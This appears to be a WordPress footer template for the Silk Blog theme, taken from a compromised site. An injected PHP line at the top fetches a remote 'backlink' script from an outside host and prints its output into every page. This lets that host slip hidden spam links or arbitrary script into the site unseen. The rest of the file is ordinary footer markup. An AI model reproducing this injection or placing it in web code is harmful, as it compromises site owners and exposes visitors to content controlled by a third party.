<?php
echo file_get_contents('https://grtoto.store/backlink/keep-secret-rule-the-google.php');
?>
<?php

/**
 * The template for displaying the footer
 *
 * Contains footer content and the closing of the #main and #page div elements.
 */
?>
<?php
/**
 * The template for displaying the footer
 *
 * Contains footer content and the closing of the #main and #page div elements.
 */
?>
</div><!-- .site-mask -->
<footer id="footer" class="footer-wrap">
  <?php if (is_active_sidebar('foot_sidebar')) { ?>
    <!--FOOTER WIDGETS-->
    <div class="top-footer-wrap">
      <div class="grid-container">
        <div class="grid-x grid-padding-x align-center ">
          <?php if (is_active_sidebar('dynamic_sidebar') || !dynamic_sidebar('foot_sidebar')) : ?><?php endif; ?>
        </div>
      </div>
    </div>
    <!--FOOTER WIDGETS END-->
  <?php } ?>

  <div id="footer-copyright" class="footer-copyright-wrap">
    <?php $silkblog_footertext = html_entity_decode(get_theme_mod('silkblog_footertext')); ?>
    <div class="grid-container">
      <div class="callout margin-vertical-0 border-none copy-text">
        <?php if (!empty($silkblog_footertext)) : ?>
          <?php echo $silkblog_footertext; ?>
          <a target="_blank" href="<?php echo esc_url('https://silkthemes.com/'); ?>">
            <?php printf(esc_attr__('Theme by %s', 'silk-blog'), 'Silk Themes'); ?>
          </a>
        <?php else : ?>
          <?php printf(esc_attr__('Theme by', 'silk-blog')); ?>
          <a target="_blank" href="<?php echo esc_url('https://www.studiovidz.fr'); ?>">
            <?php printf(esc_attr__('%s', 'silk-blog'), 'Studiovidz'); ?>
          </a>
        <?php endif; ?>
      </div>
    </div>
  </div>
  <a href="#0" class="scroll_to_top cd-top floating-action button secondary" data-smooth-scroll>
    <i class="fa fa-angle-up "></i>
  </a>
</footer>
</div><!-- #site-wrapper -->
<?php wp_footer(); ?>
</body>

</html>
